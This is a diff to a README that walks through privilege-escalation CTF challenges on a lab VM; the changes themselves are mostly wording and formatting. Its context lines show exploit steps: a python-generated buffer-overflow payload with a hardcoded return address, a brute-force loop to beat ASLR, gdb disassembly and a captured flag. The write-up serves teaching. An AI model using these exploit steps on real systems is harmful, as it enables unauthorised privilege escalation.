@@ -5,7 +5,7 @@ Privilege escalation challenges created for [Harmonie-Technologie](https://www.h
 
 | Title        | Description   |
 | ------------- |:-------------|
-| [Challenge rules](#Challenge-rules)  | VM link and Rules |
+| [About](#About)  | VM link and Rules |
 | [Challenge 1](#challenge-1)  | Bash_history |
 | [Challenge 2](#challenge-2)  | Sudo |
 | [Challenge 3](#challenge-3)  | Cron |
@@ -17,7 +17,7 @@ Privilege escalation challenges created for [Harmonie-Technologie](https://www.h
 | [Challenge 9](#challenge-9)  | mysql launched by root |
 | [Challenge 10](#challenge-10)  | ASLR Buffer overflow |
 
-## Challenge rules  
+## About  
 The vulnerable virtual machine can be downloaded [here](https://www.):
 * 32 bits
 * 7 Go
@@ -32,7 +32,7 @@ Here are the rules:
 During NDH2018, VMs kicked challengers after 60 minutes and passwords were re-generated.
 
 ## Challenge 1
-We connect to level1:
+We connect to `level1`:
 ```bash
 ssh level1@192.168.0.10
 ```
@@ -46,7 +46,7 @@ dr-xr-xr-x 12 root      root      4096 May 28 07:03 ..
 -r--r-----  1 level1    level1     595 Jun 13 10:24 indices
 dr-x------  2 level1_OK level1_OK 4096 May 22 08:36 validation
 ```
-.bash_history looks not empty. Let's cat it.
+`.bash_history` looks not empty. Let's cat it.
 ```bash
 level1@harmonie-technologie:~$ cat .bash_history 
 ls
@@ -444,7 +444,7 @@ levelfinal@harmonie-technologie:~$ ./levelfinal `python -c "print 'A'*100"`
 Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA! You can't hack me...
 Segmentation fault
 ```
-Segfault, nice. We probably have overwritted `EIP` register (next instruction to be executed). We now use `dbg` to disassemble functions and make sure `strcpy` is indeed used in `vuln` function.
+Segfault, nice. We probably have overwritten `EIP` register (next instruction to be executed). We now use `dbg` to disassemble functions and make sure `strcpy` is indeed used in `vuln` function.
 ```bash
 levelfinal@harmonie-technologie:~$ gdb ./levelfinal -q
 (gdb) disas main
@@ -499,11 +499,11 @@ This probably works without ASLR protection. But here, it is enabled. But we are
 ```bash
 levelfinal@harmonie-technologie:~$ for i in {1..66000}; do echo number of tries: $i && ./levelfinal `python -c "print 'A'*24 + '\x13\x7e\xd6\xbf'"`&& break;echo Exploit failed;done;
 ```
-![](https://thumbs.gfycat.com/TanNiceFrigatebird-max-14mb.gif)
+![](https://thumbs.gfycat.com/TanNiceFrigatebird-size_restricted.gif)
 >00fa43a89878a45deaad751f4a7c23d2
 
 ## The end  
-Thanks for reading this far.  
-I hope you learned something from it, but more importantly; I hope you enjoyed it.  
+Thanks for reading this.  
+I hope you enjoyed it as much as I enjoyed making these challenges.  
 # 
 *Created by [Lyderic 'aas' Lefebvre](https://www.linkedin.com/in/lydericlefebvre/)*
